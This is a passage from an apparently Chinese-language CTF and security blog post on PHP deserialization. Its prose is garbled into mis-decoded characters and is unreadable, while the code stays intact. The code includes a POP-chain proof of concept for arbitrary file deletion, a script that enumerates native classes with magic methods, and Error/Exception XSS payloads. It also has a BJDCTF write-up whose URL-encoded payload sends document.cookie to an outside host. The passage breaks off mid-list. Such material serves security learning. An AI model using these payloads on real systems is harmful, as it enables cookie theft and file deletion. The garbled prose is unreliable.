Test2â†’__tostring()â†’Test2.Deleteæ–¹æ³•` é‚£ä¹ˆPOPé“¾çš„æ„é€ å°±æ˜¯é€šè¿‡ååºåˆ—åŒ–å’Œechoæ¥è§¦å‘__tostring()é­”æœ¯æ–¹æ³•ï¼Œå¹¶ä¸”æ­¤æ–¹æ³•ä¸­è°ƒç”¨Test2ä¸­çš„Delete()æ–¹æ³•ï¼Œé€ æˆä»»æ„æ–‡ä»¶åˆ é™¤çš„å±å®³ã€‚</p>
<h5 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="phpåŸç”Ÿç±»æ€»ç»“"><a class="markdownIt-Anchor" href="#phpåŸç”Ÿç±»æ€»ç»“"></a> PHPåŸç”Ÿç±»æ€»ç»“</h3>
<p>å…¶å®ï¼Œåœ¨CTFé¢˜ç›®ä¸­ï¼Œå¯ä»¥åˆ©ç”¨phpåŸç”Ÿç±»æ¥è¿›è¡ŒXSS,ååºåˆ—åŒ–ï¼ŒSSRFï¼ŒXXEå’Œè¯»æ–‡ä»¶çš„æ€è·¯</p>
<p>é€šè¿‡éå†çœ‹ä¸€ä¸‹phpçš„å†…ç½®ç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Generator</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveCachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveDirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">GlobIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplTempFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFixedArray</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunctionAbstract</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunction</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionParameter</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionNamedType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionProperty</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClassConstant</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionZendExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__toString</span></span><br><span class="line">PDO::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOStatement</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapClient</span>::<span class="variable constant_">__call</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CURLFile</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__toString</span></span><br></pre></td></tr></table></figure>
<p>åªéœ€è¦æ³¨æ„ä¸€äº›å¸¸ç”¨çš„å†…ç½®ç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span></span><br><span class="line"><span class="built_in">Exception</span></span><br><span class="line">SoapClient</span><br><span class="line"><span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span></span><br><span class="line"><span class="built_in">SplFileObject</span></span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure>
<h4 id="åˆ©ç”¨errorexception-å†…ç½®ç±»è¿›è¡Œ-xss"><a class="markdownIt-Anchor" href="#åˆ©ç”¨errorexception-å†…ç½®ç±»è¿›è¡Œ-xss"></a> åˆ©ç”¨Error/Exception å†…ç½®ç±»è¿›è¡Œ XSS</h4>
<h5 id="errorå†…ç½®ç±»"><a class="markdownIt-Anchor" href="#errorå†…ç½®ç±»"></a> Errorå†…ç½®ç±»</h5>
<p>ä½¿ç”¨æ¡ä»¶:</p>
<ul>
<li>é€‚ç”¨äºphp7ç‰ˆæœ¬</li>
<li>åœ¨å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</li>
</ul>
<p>Errorç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª <code>__toString()</code> çš„æ–¹æ³•ï¼Œå¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œå¯ä»¥å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œç›´æ¥åˆ©ç”¨xssæ¥æ‰“ã€‚å…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ <code>echo &lt;Object&gt;</code> çš„å†™æ³•ï¼Œå½“ PHP å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿ç”¨æ—¶å€™ï¼ˆå¦‚<code>echo</code>çš„æ—¶å€™ï¼‰ä¼šè§¦å‘<code>__toString</code> æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯æŒ–æ´çš„ä¸€ç§æ€è·¯ã€‚</p>
<p>æµ‹è¯•ä¾‹å­ï¼š</p>
<p>æœ¬åœ°æ”¾ä¸€ä¸ªerror.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰è®©æˆ‘ä»¬è¿›è¡Œååºåˆ—åŒ–çš„ç±»ï¼Œè¿™å°±é‡åˆ°äº†ä¸€ä¸ªååºåˆ—åŒ–ä½†æ²¡æœ‰POPé“¾çš„æƒ…å†µï¼Œæ‰€ä»¥åªèƒ½æ‰¾åˆ°PHPå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥å¯ä»¥å¼¹å‡ºxssï¼Œè§¦å‘äº†xssæ¼æ´</p>
<h4 id="exceptionå†…ç½®ç±»"><a class="markdownIt-Anchor" href="#exceptionå†…ç½®ç±»"></a> Exceptionå†…ç½®ç±»</h4>
<ul>
<li>é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬</li>
<li>å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</li>
</ul>
<p>åŸç†æ˜¯ç±»ä¼¼çš„</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="bjdctf-2ndxssä¹‹å…‰"><a class="markdownIt-Anchor" href="#bjdctf-2ndxssä¹‹å…‰"></a> [BJDCTF 2nd]xssä¹‹å…‰</h5>
<p>é¦–å…ˆè¿›å…¥é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°gitæ³„éœ²æ‹¿åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ååºåˆ—åŒ–å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ç»™å‡ºååºåˆ—åŒ–çš„ç±»ï¼Œæˆ‘ä»¬æ— æ³•æ„é€ popé“¾ï¼Œåªæœ‰åˆ©ç”¨phpå†…ç½®ç±»æ¥ååºåˆ—åŒ–ï¼ŒåŠ ä¸Šä¸€ä¸ªechoï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>Error</code>å†…ç½®ç±»æ¥<code>XSS</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸€èˆ¬xssçš„é¢˜éƒ½æ˜¯åœ¨cookieç†é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨XSSæŠŠcookieå¸¦å‡ºæ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fde28dfb3-f224-<span class="number">48</span>d4-b579-f1ea61189930.node3.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>ç„¶åflagå°±åœ¨cookieä¸­</p>
<h4 id="ä½¿ç”¨-errorexception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-errorexception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a> ä½¿ç”¨ Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h4>
<p>Errorå’ŒExceptionè¿™ä¸¤ä¸ªPHPå†…ç½®ç±»ï¼Œä½†å¯¹ä»–ä»¬ä¸é™äº XSSï¼Œè¿˜å¯ä»¥é€šè¿‡å·§å¦™çš„æ„é€ ç»•è¿‡md5()å‡½æ•°å’Œsha1()å‡½æ•°çš„æ¯”è¾ƒã€‚</p>
<h5 id="errorç±»"><a class="markdownIt-Anchor" href="#errorç±»"></a> Errorç±»</h5>
<p>æ¡ä»¶ï¼šphp7.0.0</p>
<p>ç±»ä»‹ç»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* å±æ€§ */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* æ–¹æ³• */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ç±»å±æ€§ï¼š</strong></p>
<ul>
<li>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</li>
<li>codeï¼šé”™è¯¯ä»£ç </li>
<li>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</li>
<li>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</li>
</ul>
<p><strong>ç±»æ–¹æ³•ï¼š</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> â€” åˆå§‹åŒ– error å¯¹è±¡</li>
<li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> â€” è·å–é”™è¯¯ä¿¡æ¯</li>
<li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> â€” è¿”å›å…ˆå‰çš„ Throwable</li>
<li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> â€” è·å–é”™è¯¯ä»£ç </li>
<li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„æ–‡ä»¶</li>
<li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„è¡Œå·</li>
